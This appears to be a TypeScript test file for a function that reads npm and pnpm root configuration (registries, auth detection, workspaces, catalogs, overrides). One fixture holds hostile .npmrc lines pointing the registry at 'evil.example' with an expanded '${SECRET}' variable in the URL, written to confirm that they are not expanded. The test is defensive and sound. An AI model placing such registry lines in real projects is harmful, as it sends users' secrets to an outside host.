import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { readRootConfig } from '../src/config/root-config.ts'
import type { FileReader } from '../src/sources/file-reader.ts'

function readerOf(files: Record<string, string>): FileReader {
  return {
    async readText(path) {
      return files[path] ?? null
    },
    async exists(path) {
      return path in files
    },
    async listDir() {
      return []
    },
    async realpath(path) {
      return path
    },
  }
}

const noSources = { userNpmrc: null, env: {} }

describe('readRootConfig', () => {
  it('defaults to the public registry with empty collections', async () => {
    const config = await readRootConfig(readerOf({}), '.', noSources)
    assert.deepEqual(config, {
      registry: 'https://registry.npmjs.org/',
      scopedRegistries: {},
      hasAuth: false,
      catalogs: {},
      overrides: {},
      workspacePatterns: [],
      warnings: [],
    })
  })

  it('lets project registry beat user registry and env beat both', async () => {
    const reader = readerOf({ 'app/.npmrc': 'registry=https://project.example/\n' })
    const userNpmrc = 'registry=https://user.example/\n'
    assert.equal((await readRootConfig(reader, 'app', { userNpmrc, env: {} })).registry, 'https://project.example/')
    assert.equal(
      (await readRootConfig(readerOf({}), 'app', { userNpmrc, env: {} })).registry,
      'https://user.example/',
    )
    const withEnv = await readRootConfig(reader, 'app', {
      userNpmrc,
      env: { npm_config_registry: 'https://env.example/' },
    })
    assert.equal(withEnv.registry, 'https://env.example/')
  })

  it('merges scoped registries with project over user and detects auth from any source', async () => {
    const reader = readerOf({ '.npmrc': '@a:registry=https://project.example/\n' })
    const userNpmrc = '@a:registry=https://user.example/\n@b:registry=https://user-b.example/\n//x/:_authToken=top-secret\n'
    const config = await readRootConfig(reader, '.', { userNpmrc, env: {} })
    assert.deepEqual(config.scopedRegistries, { '@a': 'https://project.example/', '@b': 'https://user-b.example/' })
    assert.equal(config.hasAuth, true)
    assert.equal(JSON.stringify(config).includes('top-secret'), false)
  })

  it('never stores project auth values', async () => {
    const reader = readerOf({ 'app/.npmrc': '//r.example/:_authToken=project-secret\n' })
    const config = await readRootConfig(reader, 'app', noSources)
    assert.equal(config.hasAuth, true)
    assert.equal(JSON.stringify(config).includes('project-secret'), false)
  })

  it('ignores project lines that reference environment variables when told not to expand them', async () => {
    const reader = readerOf({
      '.npmrc': 'registry=http://evil.example/leak/${SECRET}/\n@acme:registry=https://${SECRET}.evil.example/\n@safe:registry=https://npm.safe.example/\n',
    })
    const sources = { userNpmrc: '@user:registry=https://${USER_REGISTRY}/\n', env: { SECRET: 'token-value', USER_REGISTRY: 'npm.user.example' } }
    const config = await readRootConfig(reader, '.', { ...sources, expandProjectVariables: false })
    assert.equal(config.registry, 'https://registry.npmjs.org/')
    assert.deepEqual(config.scopedRegistries, { '@user': 'https://npm.user.example/', '@safe': 'https://npm.safe.example/' })
    assert.doesNotMatch(JSON.stringify(config), /token-value/)
    const expanded = await readRootConfig(reader, '.', sources)
    assert.equal(expanded.registry, 'http://evil.example/leak/token-value/')
  })

  it('reads pnpm-workspace.yaml packages, catalogs and overrides', async () => {
    const reader = readerOf({
      'pnpm-workspace.yaml': [
        'packages:',
        '  - apps/*',
        '  - "!apps/legacy"',
        'catalog:',
        '  react: ^18.0.0',
        'catalogs:',
        '  next:',
        '    react: ^19.0.0',
        'overrides:',
        '  lodash: 4.17.21',
        '',
      ].join('\n'),
    })
    const config = await readRootConfig(reader, '.', noSources)
    assert.deepEqual(config.workspacePatterns, ['apps/*', '!apps/legacy'])
    assert.deepEqual(config.catalogs, { default: { react: '^18.0.0' }, next: { react: '^19.0.0' } })
    assert.deepEqual(config.overrides, { lodash: '4.17.21' })
  })

  it('reads workspaces as an array from package.json', async () => {
    const reader = readerOf({ 'package.json': JSON.stringify({ workspaces: ['packages/*'] }) })
    assert.deepEqual((await readRootConfig(reader, '.', noSources)).workspacePatterns, ['packages/*'])
  })

  it('reads workspaces from the packages field of package.json', async () => {
    const reader = readerOf({ 'package.json': JSON.stringify({ workspaces: { packages: ['libs/*'] } }) })
    assert.deepEqual((await readRootConfig(reader, '.', noSources)).workspacePatterns, ['libs/*'])
  })

  it('flattens package.json and pnpm overrides to selector to version strings', async () => {
    const reader = readerOf({
      'pkg/package.json': JSON.stringify({
        overrides: { foo: '1.0.0', bar: { '.': '2.0.0', baz: '3.0.0' } },
        pnpm: { overrides: { 'qux@<2': '2.1.0' } },
      }),
    })
    const config = await readRootConfig(reader, 'pkg', noSources)
    assert.deepEqual(config.overrides, { foo: '1.0.0', bar: '2.0.0', 'bar > baz': '3.0.0', 'qux@<2': '2.1.0' })
  })

  it('tolerates malformed pnpm-workspace.yaml and package.json', async () => {
    const reader = readerOf({ 'pnpm-workspace.yaml': 'packages: [', 'package.json': '{' })
    const config = await readRootConfig(reader, '.', noSources)
    assert.deepEqual(config.workspacePatterns, [])
  })

  it('strips userinfo from env, project and user registries', async () => {
    const reader = readerOf({ 'app/.npmrc': 'registry=https://u:project-secret@project.example/\n' })
    const userNpmrc = '@s:registry=https://u:user-secret@user.example/\n'
    const projectOnly = await readRootConfig(reader, 'app', { userNpmrc, env: {} })
    assert.equal(projectOnly.registry, 'https://project.example/')
    assert.equal(projectOnly.scopedRegistries['@s'], 'https://user.example/')
    assert.equal(projectOnly.hasAuth, true)
    assert.equal(/secret/.test(JSON.stringify(projectOnly)), false)

    const fromEnv = await readRootConfig(readerOf({}), '.', {
      userNpmrc: null,
      env: { npm_config_registry: 'https://u:env-secret@env.example/x/' },
    })
    assert.equal(fromEnv.registry, 'https://env.example/x/')
    assert.equal(fromEnv.hasAuth, true)
    assert.equal(JSON.stringify(fromEnv).includes('env-secret'), false)
  })

  it('reads the registry from an upper-case npm_config variable', async () => {
    const config = await readRootConfig(readerOf({}), '.', { userNpmrc: null, env: { NPM_CONFIG_REGISTRY: 'https://env.example/' } })
    assert.equal(config.registry, 'https://env.example/')
  })

  it('warns about unscoped auth keys in the project and user npmrc', async () => {
    const reader = readerOf({ 'app/.npmrc': '_authToken=secret-one\n' })
    const config = await readRootConfig(reader, 'app', { userNpmrc: '_auth=secret-two\n', env: {} })
    assert.deepEqual(config.warnings, [
      '_auth in user .npmrc is not scoped to a registry and is ignored',
      '_authToken in project .npmrc is not scoped to a registry and is ignored',
    ])
    assert.equal(JSON.stringify(config).includes('secret'), false)
  })
})
